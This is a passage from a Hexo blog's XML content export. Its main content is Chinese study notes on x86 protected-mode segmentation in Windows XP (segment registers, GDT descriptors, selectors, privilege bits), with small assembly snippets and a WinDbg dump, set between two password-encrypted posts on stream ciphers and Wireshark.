  <script id="hbeData" type="hbeData" data-hmacdigest="ea03eb633da30af33661ed3fda7dfea989900812eee66978009b6d5993b00e57">65b591f270a691a8bcf50a13db064a0540d8370b2b178bef5f886620f7f46c8f1479db192f1a37193312baa07924a1c8369ca00346dac8d3ba8240fab5a29c8365580245010c267a7f112ef96f8a74054f687dde25ff5dff3a3ca268b5aea58f6761914266f86e35b2f17ce68f02f48a360916dd7e34ee83dcc27aac26b986bc81e83bf2819136263612f1e8407c73ebb0887e7656e63c713308fe81c3bbe37973c8e13cf921a23a26229bd0dbb42085a58f730c8844e901149e5b36417c1fa922ab96d12ad405e7aaf6666ab076c1960bd33368df942841650e24858151f32e0f1310e7a2110f6a68bade9674ceadd4d67b87f201bc6beb7c41052843d3340c0e2c30942ebf2d0b67e741fa5d02f071b1d1b775849815b8f37ce412920bd76152bd3fd2a2a4335920b310fd5dbfe05e1a85141ebd36646359e873338a5f06cf11024506e9e044977de8c8755776e603d14b37830f5ba952877de87ae79da41e83a8d56ea33412319eb0a741affa6bbaf1eddec434874eb526f7eb98617ad972413cab4c4ac1516605f13399cee2e09e19cf914c909aa0fa3e8c35a34e425a3e4634ba8692d897f36eb657b581eeb5b84388567baf768728f49a3abb20ba72ee26ec393a168ef008b5ed9d518cd9e16065642b58acc66ce6b58c6d55dc10fb78568e5db93cd2a15a95a124f01eac0d975a398b0f9a077c5f7efd5c9bf9e819ba367e9444156ee19789eae86394578a1edc6994185945ca301a1a4ab5fdcab16b6f52c3eaa8d06eab3cb79aebee4b95c6eaf0a8af84ba24486021cd76b8ace83e938d8fb631f48a15745cae4b8747389d6f68dbbf23a428afc4438b154e85b691306994c60ff63a688cf8403511bacd1d7eed0b7d1c92191151906a875d0900037c91e2320a7def1633f8fbb15105ae6cc83ca398d94a1ba8036cc1b65f0a80f7cddee83ab773fc0518ad8748c9b3a9cc1bfb4ea7b33a57a3b93a3ed274015dbc33f3ca2c0f7f9e8c2913623790e7f4b2fbf82192247e380fa014e31184c06af9c555e2d9047df82df8a48468d1add318c7e49f8c8a14463fa5a80ec4387bd9869b8e8c8a93f3724667fbed265b26fa1a127b72e64f5c8c249a49782534041df6745ab6f1226d37c329eff642dbebb287acb0866831558fbf4eb28d323bc892d59a183b4ac6ca51065d2a5d772dfdbb78cf67bd1e282e930cbdb1c8ef59c3d608037183e15432aa6b018f1a37ee2ef71b20b663c40602b9e05e237dffe7ad9fb48724b3125f6ba066809a60e0511f856987af0a39f04d1217d67675b6d896e8df90ffa31e07904acfbedb83c6714cc64b5a7de50405d786317847f0c0b3f96beb20a898d2e810aa9e0fa3e349eabd86bdb966c69038d17d602653dd09c31d3c1b815fdf7effca352f357b3c66f55a7dd27e78356ae9804c3bfdcc4956a4132cd148b4cfe756287a2f478b1114d32424134cdf42a72e653d4245345c5314621a77e613069511e0074a2ef11b5f974964c45e02672fd02744cc05a7500be6d111c4be4d21868f5bb2d2c190d596e904f2cbaf35f02ee8d27eda867e843df2b080d0e679164e8d7b17ef901d090db38c5e7e61ea430bc6d3d1afaece001288fa996797204d1ab75239b96627cc6efe0a891b6190513da15331ac6a57a225f93809da7d82e1ed7fe6d2409263b5cc902bbf7739ce8c393abf8e72fdb3ebf3e288ba8f331bc2ca44b77297fe920ebecc4f3814cda54a7a7a4e142867b4a8d27ef1f2b2284c6ff72a4890dea6ce9bbc6a180daec99ace9a34eb32b9e3e3d1216d8bf30c087f83028a51d00446207fcbcd6087533851f8b37b3a8f71ecfcaecf3f50739b407f1e4d2d6899cc8fcee240b3a14823b293348c8ce857702cb105a0152d2b7d7bc9822d3e9720a3fc8ae8a28ee40cbff01277af5f5b77c723af4bba0f3ea6b71702fabe260fe46b595d068bff7961b3e6ba97d579d466fd487b670ae0c7a5715fa8b5d5f1b2449ab76b428dcd73822ebff61db5eb66d9c612ebbb55df761f35d5c7fcf1c2a72309b4ded724151e40e910ccf7bd4fd89c8a1eee4b41231262ccd5d69bc582305a04b2f8589c3501a4741fec5893d2cc2083622c289e39073d90ad7d622e0f94b4cbbb7b5c009ed151f0faef710e868cac82693a7fb823a038d22dd3e573051ba5b612332e930c4a168e5b4e34a580db95790b690f4c75f395e29359c914d162bd2afee8bdfbf7b0c0bbc3b7264b7b506b1608b098a25880abd86809ecbd0ea0c8a12167c11cfacfed5bfc13a438c247b19f4c0f21ee75946554196aed4ca9ade52faaedc9f3a7cd625dc8438783a6ba7d295649349568def23281757e1b3edf3125260c6217f4a9bf8f20f90b9f0b4c8f3dd77b968786d6deb45d75c2eac6d5108295061dcbfd985f44e343303976c83091e5bc5ed40035387d73964807e4d81f9357660abe07b34d7efe049c39db26c43c5d30875507bc5a4fe573c2ab84931ebdb7d86886f070cd28b7e40c0173a15d58609b71cc182a2a49828aacbe777e9bb33b71c9d251cb5c079366f3a11ec57b843848e5dfb2f4b883cb69a0f2a46f078546f2f30e7ccddb256673c64c610bcfcd13c6b17c115006eb30846cbbb1029d7e3d69e6b2dfeecdf515f548e965c8c488c419f4f13ff648839c39697fbe8bd4410ca9bcbc613b66c72f3289a083db531680ed132d65d2d3065840764732c4608766b69a37a09ecdf1013755a53f342a0c4d6ff437ff4bfbf0e1e86521b4c3386a69f12331f40811d809465cb7d7db496bb490fe918523ad990bfb260aba77cb95e4256dec4dc40d5a339bb2d4e305f8f61ff25fcf0fadd04a58b59a22fea50ad9d96470f5d06e5855a782cc82ceffa9709a4b6e52585c2caf3f62d8f9dd9df0b64af5fee7cc741234bc83fbf8ad5019410c3be85d4d040e27de6c470a2cc30d7a930a7503db856c4c37dc1ed9fcae0eceb06c071393380a81ca6777bcda2f02ec2fdfe3c53f57e830ba2571a97620bab9e32bac79a8d1f2c2c0d09ee41fb14aaabd2a0ce405bf145aa72155395839f0137e71f8c25e15f22cd5d292c23a28088b0dc56a4f26d4d01e60827d71703d797cb0a388e76b02d7ed77b600a6d2365647a0673d4a500275328791de2be8709064a0eb4256e15b72fb91f7679538b27d25c9f098adb2e78320ad6d04b9dd69c7bad8d63c040ef24c8b6109ea547fe8fc6ecaca78f736c0e47c0a7594c43d92298d32a42b094f753bca732322f92c87695643f4172d9ee89ee582279c94cba26a833e836ac50b8127b0b3ac1f60835760c7ff19b7722875757480a9faa3128da06a87eefeb26b44d79e6c2d476a9bbea1b2bb03c525dffa53b137fc1202b61f26eea224a4162b514b58046198378da4a44907e501f59812c688d95da45a1101245fe5362c3a172c352b4234974b3cb3d00d81ce1b930d2374f31b985458c2c02c8c3bb714865759e517ab1455bf2799ec96a950e07f39d0cc6acb027d23a283b500f7de4d28a7520d22</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>序列密码</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 段保护（一）</title>
    <url>/post/WinXP-ProtectionMode-Segment/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-什么是保护模式"><a href="#1-什么是保护模式" class="headerlink" title="1 什么是保护模式"></a>1 什么是保护模式</h2><p>R3--SDK</p>
<p>R0--WDK</p>
<p>X86 CPU的3个工作模式：<strong>实模式</strong>、<strong>保护模式</strong>和<strong>虚拟8086模式</strong>。<br>现在的操作系统都是基于<strong>保护模式</strong>。<br>保护模式的两个重要机制：段的机制、页的机制。</p>
<div class="note warning"><p>保护模式：保护对内存的访问、保护某些指令的执行（特权指令 ）</p>
</div>

<p>段的机制非常复杂，了解段机制就要先了解<strong>段寄存器</strong>。</p>
<h2 id="2-段寄存器"><a href="#2-段寄存器" class="headerlink" title="2 段寄存器"></a>2 段寄存器</h2><p>段寄存器一共有八个：ES、CS、SS、DS、FS、GS、LDTR（Windows没有使用）、TR。</p>
<ul>
<li>每个段寄存器有<mark class="label danger">96位</mark>其中GS、LDTR这两寄存器Windows没有使用。</li>
<li>LDT表Windows也没有使用。</li>
<li>只有16位的可见部分：<code>Selecter</code>。</li>
</ul>
<h3 id="2-1-段寄存器的结构"><a href="#2-1-段寄存器的结构" class="headerlink" title="2.1 段寄存器的结构"></a>2.1 段寄存器的结构</h3><p><img data-src="https://s2.loli.net/2021/12/14/6R9qUTsupMkz827.png" alt="1.png"></p>
<p>可以通过结构体表示为如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegMent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Selecter;   <span class="comment">//16位的可见部分（段选择子）</span></span><br><span class="line">    WORD Atrributes; <span class="comment">//16位的属性（可读可写可执行）</span></span><br><span class="line">    DWORD Base;      <span class="comment">//32位的Base(当前段的起始地址)</span></span><br><span class="line">    DWORD Limit;     <span class="comment">//32位的Limit(当前段的长度)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编读写一个地址：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[<span class="number">0x00123456</span>],eax</span><br></pre></td></tr></table></figure>

<p>读写的地址实际上是<code>ds.Base+0x123456</code>。</p>
<div class="note warning"><p><strong>实际所有地址的读写都是这个结构</strong>：<code>XS.Base+Offset</code></p>
</div>



<h3 id="2-2-段寄存器的属性"><a href="#2-2-段寄存器的属性" class="headerlink" title="2.2 段寄存器的属性"></a>2.2 段寄存器的属性</h3><p><img data-src="https://s2.loli.net/2021/12/14/zI3QXb5RtSmMkZP.png" alt="2.png"></p>
<p><strong>段寄存器的读写：</strong></p>
<ul>
<li>mov ax,ds      &#x2F;&#x2F;只能读16位可见部分</li>
<li>mov ds,ax      &#x2F;&#x2F;写入是96位</li>
<li>可以通过MOV指令进行读写（LDTR和TR除外）</li>
<li>CS是可读、可执行、但不可写</li>
</ul>
<p><a href="https://blog.csdn.net/Kwansy/article/details/108738075">探测Base示例：</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> var = <span class="number">1</span>;					</span><br><span class="line">__asm					</span><br><span class="line">&#123;					</span><br><span class="line">	mov ax,fs				</span><br><span class="line">	mov gs,ax       <span class="comment">//等价于fs.base+0			</span></span><br><span class="line">	mov eax,gs:[<span class="number">0</span>]	<span class="comment">//不要用DS 否则编译不过去		</span></span><br><span class="line">	mov dword ptr ds:[var],eax	</span><br><span class="line">	<span class="comment">//mov edx,dword ptr ds:[0x7FFDF000]</span></span><br><span class="line">	<span class="comment">//常规来说，地址0x00是不允许读的，但是FS.Base!=0，所以这里可以编译并执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的GS就是FS。</p>
<h2 id="3-段描述符"><a href="#3-段描述符" class="headerlink" title="3 段描述符"></a>3 段描述符</h2><p>GDT表存的是段描述符，每个段描述符是64位（8字节）</p>
<p>这里涉及到两张表：GDT(全局描述符表)与 LDT(局部描述符表)。Windows用的是GDT表，LDT表几乎没用。</p>
<p>段描述符结构：（Intel手册卷3A）</p>
<p><img data-src="https://s2.loli.net/2021/12/14/e4MfhwDpIEPmLFl.png" alt="3.png"></p>
<div class="note warning"><p>段描述符表的位置、大小信息存在<mark class="label danger">GDTR位</mark>寄存器中，GDTR寄存器共6字节：</p>
<ul>
<li><p><strong>低2字节</strong>：段描述符表的<strong>大小</strong></p>
</li>
<li><p><strong>高4字节</strong>：段描述符表的<strong>起始地址</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/14/6icvS7AetpMmVrC.png" alt="4.png"></p>
<p>L8：表示输出的组数为8。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/i18sCte3UGb6vyf.png" alt="53.png"></p>
</li>
</ul>
</div>

<h3 id="3-1-段描述符属性所在位置"><a href="#3-1-段描述符属性所在位置" class="headerlink" title="3.1 段描述符属性所在位置"></a>3.1 段描述符属性所在位置</h3><p><strong>Atrribute</strong>：高4字节中，8～23位</p>
<p> <strong>Base</strong>：</p>
<ul>
<li>高4字节中，24～31位，0～7位</li>
<li>低4字节中，16～31位</li>
</ul>
<p><strong>Limit</strong>：</p>
<ul>
<li>高4字节中，16～19位</li>
<li>低4字节中，0～15位</li>
</ul>
<p><img data-src="https://s2.loli.net/2021/12/15/voiAm8XzI35Buwj.png" alt="9.png"></p>
<h3 id="3-2-段描述查找练习"><a href="#3-2-段描述查找练习" class="headerlink" title="3.2 段描述查找练习"></a>3.2 段描述查找练习</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000</span><br><span class="line"><span class="number">8003f</span>000  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>010  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffa00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>020  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br><span class="line"><span class="number">8003f</span>030  ffc093df`f0000001 <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">8003f</span>040  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">8003f</span>050  <span class="number">80008955</span>`<span class="number">27000068</span> <span class="number">80008955</span>`<span class="number">27680068</span></span><br><span class="line"><span class="number">8003f</span>060  <span class="number">00009302</span>`<span class="number">2f</span>40ffff <span class="number">0000920b</span>`<span class="number">80003f</span>ff</span><br><span class="line"><span class="number">8003f</span>070  ff0092ff`<span class="number">700003f</span>f <span class="number">80009</span>a40`<span class="number">0000f</span>fff</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2021/12/15/S6cn71NYfpQdw2h.png" alt="10.png"></p>
<h2 id="4-段选择子"><a href="#4-段选择子" class="headerlink" title="4 段选择子"></a>4 段选择子</h2><p>段选择子是一个16位数，该数决定了取gdt表中查哪一个数据。这个值就是MOV DS,AX给的AX的值，从这个值中取赋值剩下的80位(96-16)。</p>
<p><img data-src="https://s2.loli.net/2021/12/14/hjy1X9lCY3OULfi.png" alt="5.png"></p>
<div class="note primary"><p>RPL共2位，<mark class="label info">值越小权限越大</mark>。值为0x00、0x11，对应于Windows使用的0环、3环。</p>
</div>

<p><img data-src="https://s2.loli.net/2021/12/15/HmBJCXDugr95czQ.png" alt="6.png"></p>
<p><strong>加载段描述符至段寄存器（其他几个汇编指令修改段寄存器）</strong></p>
<p>除了MOV指令，我们还可以使用LES、LSS、LDS、LFS、LGS指令修改寄存器。</p>
<p>CS不能通过上述的指令进行修改，CS为代码段，CS的改变会导致EIP的改变，要改CS，必须要保证CS与EIP一起改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[<span class="number">6</span>];                    </span><br><span class="line">__asm                            </span><br><span class="line">&#123;            </span><br><span class="line">    les ecx,fword ptr ds:[buffer] <span class="comment">//高2个字节给es，低四个字节给ecx    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<div class="note danger"><p><strong>注意</strong>：RPL&lt;&#x3D;DPL(在数值上)</p>
<p>RPL是段选择子的权限，DPL是段描述符的权限，数值越大权限越小。</p>
</div>



<h2 id="5-段描述符的P，G位"><a href="#5-段描述符的P，G位" class="headerlink" title="5 段描述符的P，G位"></a>5 段描述符的P，G位</h2><p><img data-src="https://s2.loli.net/2021/12/15/voiAm8XzI35Buwj.png" alt="9.png"></p>
<p><strong>P位</strong></p>
<ul>
<li>P &#x3D; 1 段描述符有效</li>
<li>P &#x3D; 0 段描述符无效</li>
</ul>
<p>通过指令将段描述符加载至段寄存器中，<strong>先检查P位，如果为0，那么该段描述符无效，其他检查都不做了</strong>。</p>
<p><strong>G位</strong></p>
<p>G位决定Limit的大小范围。D&#x2F;B位对数据段来说决定地址空间大小。</p>
<ul>
<li>当G&#x3D;0时，Limit的范围是0x00000000-0x<strong>000</strong>FFFFF，其中，段描述符的20位在低位，<mark class="label warning">高位补0</mark>。</li>
<li>当G&#x3D;1时，Limit的范围是0x00000FFF-0xFFFFF<strong>FFF</strong>，其中，段描述符的20位在高位，<mark class="label warning">低位补F</mark>。</li>
</ul>
<h2 id="6-段描述符的S、Type域"><a href="#6-段描述符的S、Type域" class="headerlink" title="6 段描述符的S、Type域"></a>6 段描述符的S、Type域</h2><p><img data-src="https://s2.loli.net/2021/12/15/voiAm8XzI35Buwj.png" alt="9.png"></p>
<div class="note success"><p>分析一个段描述符：</p>
<ol>
<li>先看P位</li>
<li>再看S位（S &#x3D; 1  代码段或者数据段描述符，S &#x3D; 0 系统段描述符)</li>
</ol>
</div>

<h3 id="6-1-S位"><a href="#6-1-S位" class="headerlink" title="6.1 S位"></a>6.1 S位</h3><ul>
<li><p>S&#x3D;1，表示代码段&#x2F;数据段；</p>
</li>
<li><p>S&#x3D;0，表示系统段。</p>
<p>S位决定着Type域的含义。</p>
</li>
</ul>
<p>DPL两种情况：00、11</p>
<p>也就是 00cf<strong>9</strong>300&#96;0000ffff 的十六进制高四字节第5个数只能为9或F才表示一个有效（P&#x3D;1）的段描述符CODE&#x2F;DATA</p>
<ul>
<li>S &#x3D; 1，CODE&#x2F;DATA<ul>
<li>0x1001：DPL &#x3D; 0x00</li>
<li>0x1111：DPL &#x3D; 0x11</li>
</ul>
</li>
<li>S &#x3D; 0，系统段描述符<ul>
<li>0x1000：DPL &#x3D; 0x00</li>
<li>0x1110：DPL &#x3D; 0x11</li>
</ul>
</li>
</ul>
<h3 id="6-2-Type域"><a href="#6-2-Type域" class="headerlink" title="6.2 Type域"></a>6.2 Type域</h3><p>TYPE域共4位，可以通过查表来确定其含义。（S&#x3D;1，CODE&#x2F;DTA、S&#x3D;0系统段描述符）</p>
<ul>
<li>当S &#x3D; 1时，段描述符表示CODE&#x2F;DATA。</li>
<li>当S &#x3D; 0时，段描述符是一个系统段描述符。</li>
</ul>
<div class="note success"><p><strong>S &#x3D; 1，Type&#x3D;0x1xxx，CODE代码段描述符</strong></p>
<p>CODE：</p>
<ul>
<li>A：段描述符是否被使用过<ul>
<li>1：使用过</li>
<li>0：未使用过</li>
</ul>
</li>
<li>R：是否可读<ul>
<li>1：可读</li>
<li>0：不可读</li>
</ul>
</li>
<li>C：一致位<ul>
<li>1：一致代码段</li>
<li>0：非一致代码段</li>
</ul>
</li>
</ul>
<p><strong>S &#x3D; 0，Type&#x3D;0x0xxx，DATA数据段描述符</strong></p>
<p>DATA：</p>
<ul>
<li><p>A：段描述符是否被使用过</p>
<ul>
<li>1：使用过</li>
<li>0：未使用过</li>
</ul>
</li>
<li><p>W：是否可写</p>
<ul>
<li>1：可写</li>
<li>0：不可写</li>
</ul>
</li>
<li><p>E：拓展位</p>
<ul>
<li><p>1：向下拓展，有效地址为右边红色（红色为64KB或4GB）</p>
</li>
<li><p>0：向上拓展，有效地址为左边红色（<strong>Windows使用</strong>，红色为64KB或4GB）</p>
<p><img data-src="https://s2.loli.net/2021/12/15/WGDYjrnBzgNEv74.png" alt="14.png"></p>
</li>
</ul>
</li>
</ul>
</div>

<p><img data-src="https://s2.loli.net/2022/01/29/p7igRC5t3NfzAFy.png" alt="13.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/29/niLUjlR5sg4Q6JD.png" alt="15.png"></p>
<h3 id="6-3-练习"><a href="#6-3-练习" class="headerlink" title="6.3 练习"></a>6.3 练习</h3><p>1、判断哪些是系统段描述符？哪些是代码或者数据段描述符？</p>
<p>2、判断哪些是代码段描述符？哪些是数据段描述符？</p>
<p>3、查分几个数据段：EWA</p>
<p>4、查分几个代码段：CRA</p>
<p>5、查分几个系统段描述符，分析属性</p>
<p>先看P位，再看S位。</p>
<p><img data-src="https://s2.loli.net/2021/12/15/G8WLm1bTtCSkVpX.png" alt="16.png"></p>
<h2 id="7-段描述符的D-x2F-B位"><a href="#7-段描述符的D-x2F-B位" class="headerlink" title="7 段描述符的D&#x2F;B位"></a>7 段描述符的D&#x2F;B位</h2><p><strong>D&#x2F;B位对数据段来说决定地址空间大小</strong>。</p>
<ol>
<li><p>情况一：<strong>对CS段的影响</strong>（加载：MOV CS, AX）  </p>
<p>D &#x3D; 1  采用32位寻址方式  </p>
<p>D &#x3D; 0  采用16位寻址方式 </p>
</li>
<li><p>情况二：<strong>对SS段的影响</strong>（加载：MOV SS, AX）  </p>
<p>D &#x3D; 1 隐式堆栈访问指令（如：PUSH POP CALL等会修改ESP） 使用32位堆栈指针寄存器ESP          </p>
<p>D &#x3D; 0 隐式堆栈访问指令（如：PUSH POP CALL等会修改SP） 使用16位堆栈指针寄存器SP  </p>
<p>指令前缀67：改变默认寻址方式，但不是改D&#x2F;B位，若默认是32寻址，则改为16位寻址。若默认是16寻址，则改为32位寻址。</p>
</li>
<li><p>情况三：<strong>对数据段DS、ES的影响</strong>（加载：MOV DS, AX）</p>
<p>D &#x3D; 1 段上限为4GB     0xFFFFFFFF  </p>
<p>D &#x3D; 0 段上限为64KB    0xFFFF </p>
<p><img data-src="https://s2.loli.net/2021/12/15/VHM7wEbe92Ooys1.png" alt="17.png"></p>
</li>
</ol>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment/">Windows XP 段保护（一）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment2/">Windows XP 段保护（二）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment3/">Windows XP 段保护（三）</a></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark简单介绍和数据包分析</title>
    <url>/post/Wireshark-1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="9aff91093715ab64d421d4fa481a55f3767bddf54339176be2ba7b3857c485ef">f2cb6dad3997b265c98f36a97452129cc092e92f124168e062928c4d9cb8fadca46648e736fc1bc951b9b43d510bf6863bad8153b565e4b7b9e9d750ec263e61dae4caaa1c3232be7ddb198dfde0456bc027277cf5fad9018b3dd5292b049656482f0332d0ab6096a5eec47ad4d9a6c6a6b8e81bf6eea1d3eaa86249d034f9cc2a59b9824fd4cb57e0b0857ae434e8579cd2d734896d659c1227c32c6855c313afdb08b85ae06eb6da15d4307093f1e59370fafa95bf10f96abb6708f5d0d200265d2a79ca99967e0c0b38f53776b550d935a3c4d52d4a220babd2d5c189e6310bf58c4d65eb5e4b3d2b8eae1bc1cab97da116a24d53d7ac4a51d611d47e139ffb8213dbf340a5adf0261e5640d30bc0a8c7f10f025d43e2ba343e85d65c687b5e6a32747817cfe0fcdb99cc0ee2fc83955221b5070631391f0ffb4e833071b481a4872794ff509657d46a751c5a24266a197126c53b6c86f80a592a1c11dde984071aa8efbcb060b036382fb92f49c627a15ab9b9f449def65821ac9600208a676b653846551904d9a839fcc6dfed561b38078d663abf018d4878cfa50c8854b8a044d94bbabacc70da700241923fed0b20a1453264340d934984aacc871cd17543f010f57927a1b07425e66c09aa57d3c73b565d07018d340dca20107223ad5be413fb37dfd0d76a8104907c1cbe20b9ec973400d7ffb4a2fcf0ed2d6b60dfd4a6ef6028b2cb6dc3c6a414446f2016861bbb1ea5cebc24c5185082580f089d3490b7b60bcdcf86bdf78ccb56beadd0e5c4e0c2a5a37caaed42e7c0a581b038b89d1cad7c5cd8b39abdf083f1c32f4b87ba9edf64c370f77607058639f1e834f4561a907cad3ffcddc742069962d40ab765d91fe948c254a8f43cbbadb76f29e85c74e6e7ba3423a45909baab2b650b7b8939dffa9ae3d7ab3307854dfad67b60cd0136028c2bdf52c9b0cbe6d9fad529de5787d8e12820929f487b23761532d7a1781e71271444119d2583799d6bebf013bf147cbc8310747658452ff53cd2d46d64f91a638f8eff880ef8e3300a0d74118fbdfee974110db6dd8d804076a56a14feaba27090ee5df21a3c82a667ef44661bf83a6cf3b46faafec9eff3741e44a5e910abb989986851cbe47844ff142813ab61909545686104079cf6999248bdbaa3353ca8332f9a5e00b656ffe32cd3b2bb575bddd7e65497e2ada3ffaf138e468c9427dea8394c51812deca94a4411ddc321aa3e88689462e2be5804bf73c2ba802a306c4c322ef2b811dba4b2a9d4862c14bfc47dc5b7dd4f34abd638ed26a3e2668acea674f4d9f99a0ff5f5e0e544b794317c53e4c99c106058d4c9473de690d6b9b9099981804823d96586de9bfc20c4ee94b4aaa3a69218e8324eb3479b8381d9a509a8dacaaf5bd99fff7320580b22304f746c8df1ce946c23b39648c73799313bfc530caa2895a446bb1a9b695af178886b1afe43349f638e2f021be96db1a3ab13cfbb2ca2442b12f915e79f053e559bbd66eed1745d3bc9cef8fddec8a7c92ce29fd5da46be68f4b1a09d477f79056ade75faddabb376f7e6ca88b1cbfc5033850e04ed9445884ba255908ba117f6c65f702318e1eb47b3d05ff90fb27003a6c8d9c87e355e0c5ad8b91fa76096f7949d3d2bea8e21620b495ac58e1aa62c8d07293498ad4ca63c42c9f39a6429981e988a69a41193ffbd6bc0ec162a2f11a279a0e831fc5feaf93785e8a20ae159b68c94b37d2d17f5e5be60c92196d4c7543c2a56446bca107f92fb88dadba4dd6b093454b541d3f0065dc8cf1acb7869637c9e9a1ddedc2d6b85f110fd48bb3a431ece66e6493811d2f5085eaae1a4d568419531061433d2283c8505eba171e8caf0e26c13155c0c0bd6fe997da44851307900720c5a4d61ee2e6a98dbcad7b483537460aea91a2119292078c5e3556d8881875718041859ab3998175c96d234574a9b152d9a78af3256210bfadf80dfdf8ea829a3ddbe87322e74eb6ec8317ece0429c16d3ee9924d122c15146cc2c7f06fdef00dcd0a4c3b985398324aeffba3f6d7bd416fbeadf17078ccc162de9225c1f8c0282547918cc4b57174c1de9268be55eb75bdce84baf823e4fbac25c625da6df71af03c539d9901765f1f14b6876cb15c9e02fae3f6cd4a6a3fd364c3777f52e664a0a3e7099f9d1bad3846b1a58d4b87edd440cc883af9ddb51cdf5022c4778e19687ef491e0a2ee5a47770b96396b140b0ef39800db4d8af8d03a9a29718787c0e1c79183f1ec828430ca040567ad2e6f27052efe79b33777b28c8b344fd1e0a54dcd2b9e49b4ecd3c129828729d0eeb1013483a3d1a63db1827727851f80322f6109b80b0349ebfbe6434c24093a7d02e1bb03370a960f0920bc9af7a6fd71c2cfe06194622b6b15959bdf34a79657a8a71913d45240548c98fc63cd33f8b58b20a00035c8ca6627aa7d7555a7a193949f164a420abb5365df00158786acdc119fb089ca6bd9f612d7855bdf5473748552b88df1788a1a29b454cff0fe576965dd22aa6b094236052cb4ab3565e07a321cd0f6c8677af5fa8d9e24565e905d30015d75dad6eed8c8d92027eec1e8f8f5e0041a8a4c7a865825f24a61dfa32ff86a8fcae8205a0ab6f92d4e16b99ae40876c455d1cce2faeb8682dc92262f001f3254bf7578d7e032a135882a46bbdeed42bf656efc4000d497da1298c228bf0403e4ff863d99c54fb7b2ed97d6b2c2bf282429dc19ddd8464bfea8e2f2f429529c8a8e3084e9ec4713802cef0f3ca0af11332159a1cb04471d93aaf8d46fb43799369d195c8dc16066e7159a127a31a7f303f9a5eeeeab7c2a63902ba85ef8fc3afbcf2b69a75eb8f442853f11cc5b4932a94d9ad6197845886f41769d7acd9f5f790b5937bf1cf0b3be072c8520bf1aef8a68d3853879a26f55e7175e7efdfce02e4f758cc8398969e4f5d51bd3d0588752e411be7438da3e07c563fb996ce733581d389e6c0f8787cfd1808fa5c7102f0d9a984c6d13e627a570f9c0fb16822616d499756b92f0da67a748263490573da861c9d178faf2745c2a1f8db8ac61a771afe417078d7a2d5be1cb89a673218644d0ed730ecd77965d83853173abc9ce8552f757980d950e7558c10f2b176043a5c1db3d21867c266100aa0daf74b21b486743c238982feeb687b63db528fac5bd1ee056583e09eb5ecc8a0372a653d72353b5ac818d745cb1719a128eb8bb4b2b3f889da379186181799f219d85889634ec57c3cd0bcfacf29da0d1c3875ed64b312305b75258e59444fa23a3ffa32b21b83910f3487cf4c0489d8b984cc34eabec82da1ae6244655094ef2a0133594762d3256192670430963b1fe0eb561d4a55139c2b9a56c500962074d4c189175defe36813af41ffcd6319f7c11e1b9905711d00e3c16777178553795efae40dc24e953b241ca507897400bff49709c50a19bfbd671471709fed2a6263b49753948e04ced1d89ace412dbad5d8a0f12fe9788d746b6284fa17337f8f0dad375a7d20ccedd1f8608848374d42b41df2be989c4e2138bc917db174e41e14970ed2c81edc22a2aa089fd13d42ab662ccc683ebe7f9356b12f112f6bfa5bfdd60bbaa900d4d2666cd5d635735432de04495e101159468f592ec500a74aa6de3761f32c2fb8ce6a9f195230826957c6a4c3c8383f1fd8536fe804cca237000d38ebaa3abb2a245be1d5b2e7ea0ad6d5b1dcca04cbeaf1d7727e613301df97e3d144121a1ce27e4575581c7c05fa70f57cbe61872e4bdeb26e489704fe7b7dda23726741e9b3c446e1c82c02cbea1eef9cd8747152c16be65bfde5210efeaa6767d47c1cbf4c70980347f8ad4755f79ee74962ccd695b5bab7f60e45d6a3bb66321a1fc0631f8ec0d530a06e900c9cf92f3b594f97cf1a4b09b36c938af0dd1c35b1d9